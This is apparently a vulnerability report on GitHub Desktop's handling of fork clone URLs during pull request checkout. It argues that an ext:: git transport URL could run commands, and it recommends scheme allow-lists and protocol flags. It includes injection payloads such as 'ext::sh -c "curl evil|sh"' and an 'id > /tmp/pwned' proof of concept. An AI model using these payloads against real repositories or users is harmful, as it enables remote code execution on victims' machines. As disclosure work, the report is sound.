### Title
Unvalidated GitHub API `clone_url` for PR fork remotes enables arbitrary transport-helper execution via `git remote add`/`fetch` - (File: `app/src/lib/stores/app-store.ts`)

### Summary
When a user checks out a pull request from a fork, GitHub Desktop takes the `clone_url` field from the GitHub API's pull-request `head.repo` object — a value fully controlled by the (unprivileged) fork owner — and passes it straight into `git remote add` and subsequently `git fetch`, with no protocol allow-list or scheme validation. Git supports the `ext::<command>` remote helper transport, so a PR head repo whose clone URL is crafted as `ext::sh -c "...")` (or similar) results in local command execution as soon as Desktop resolves/fetches that "remote" for the PR checkout flow.

### Finding Description
`AppStore._findPullRequestBranch` receives `headCloneUrl` (sourced from `pullRequest.head.repo.clone_url`, an API response field) and, if no existing remote matches, adds it directly: [1](#0-0) 

The `addRemote` helper does no sanitization — it simply runs `git remote add <name> <url>`: [2](#0-1) 

Immediately after, if the remote branch isn't found locally, Desktop performs a `git fetch` against that attacker-supplied remote: [3](#0-2) 

This code path is reachable purely by an unprivileged GitHub user: they fork a repository, open a pull request, and get any Desktop user to click "Checkout this PR" (in-app) or use the "Open in Desktop"/`x-github-client://openrepo/...?pr=NNN` deep link, which routes through `dispatcher.openPullRequestFromUrl` → `appStore._checkoutPullRequest` → `_findPullRequestBranch`: [4](#0-3) 

Nowhere in this chain is the URL's scheme checked. Contrast this with the codebase's own hardening elsewhere for similarly attacker-influenced URLs: `enterprise-validate-url.ts` strictly enforces `https:` only, `clone.ts` blocks sensitive destination paths, `submodule.ts` explicitly disables `protocol.file.allow` unless `allowFileProtocol` is set, and `resolveWithin`/`sanitizeCloneName` guard path traversal for clone destinations and deep-link filepaths. None of these existing guards apply to `headCloneUrl`/`clone_url` used for PR-fork remote creation — it is the one major attacker-influenced string in the app with no protocol allow-list.

### Impact Explanation
Git remote helpers registered via the `ext::` (and, on some platforms, `fd::`) scheme execute an arbitrary shell command supplied in the URL whenever git attempts to talk to that remote (fetch, ls-remote, etc.). Since `_findPullRequestBranch` both adds the remote and fetches from it, a malicious fork's `clone_url` masquerading as `ext::sh -c "curl evil|sh"` would cause command execution under the victim's user account the moment they check out or open that PR in Desktop — a full renderer/host-level RCE outside any sandbox, satisfying "attacker controls a GitHub API object … result is code execution."

### Likelihood Explanation
The `clone_url` field returned by GitHub's REST API is normally constrained to `https://github.com/...`, but Desktop also supports GitHub Enterprise Server. Note: Desktop's own trust model treats `head.repo` as any repository object returned by the configured API endpoint — I could not verify from local code whether GitHub.com/GHES enforces server-side sanitization of `clone_url` for all repository types (e.g., mirrors, migrated repos, or enterprise instances with custom hosting), so exploitability depends on whether an attacker can get an arbitrary string into that specific API field, which is a assumption outside this repo's control and reduces certainty for the dotcom case. It is still valid to flag as a defense-in-depth gap because the client performs no independent validation, unlike its treatment of other attacker-reachable URLs in the same codebase.

### Recommendation
Before calling `addRemote`/`git fetch` with any URL sourced from the GitHub API (`clone_url`, `ssh_url`) or from deep-link/CLI input, validate the scheme against an explicit allow-list (`https:`, `ssh:`/`git@` SSH syntax already parsed by `remote-parsing.ts`) and reject `ext::`, `fd::`, `file://`, and any other transport-helper or local-path scheme, mirroring the pattern already used in `enterprise-validate-url.ts`. Additionally, invoke git with `-c protocol.ext.allow=never -c protocol.file.allow=never` (or set `GIT_ALLOW_PROTOCOL`) for all remote-add/fetch operations driven by PR/API data, the same defense-in-depth already applied for submodule updates.

### Proof of Concept
1. Attacker forks a target repository and opens a pull request from the fork.
2. Attacker manipulates their fork's GitHub repository metadata (or an enterprise/self-hosted GitHub instance) so that `head.repo.clone_url` returned by the API is `ext::sh -c "id > /tmp/pwned"` (or equivalent OS command).
3. Victim, using GitHub Desktop, clicks "Checkout this PR" on the pull request, or clicks an "Open in Desktop" link with `?pr=<number>`.
4. `dispatcher.checkoutPullRequest`/`openPullRequestFromUrl` → `appStore._checkoutPullRequest` → `_findPullRequestBranch` executes `addRemote(repository, forkRemoteName, headCloneUrl)` followed by `_fetchRemote`, both of which invoke `git` with the malicious `ext::` URL, causing the embedded command to run on the victim's machine.     }
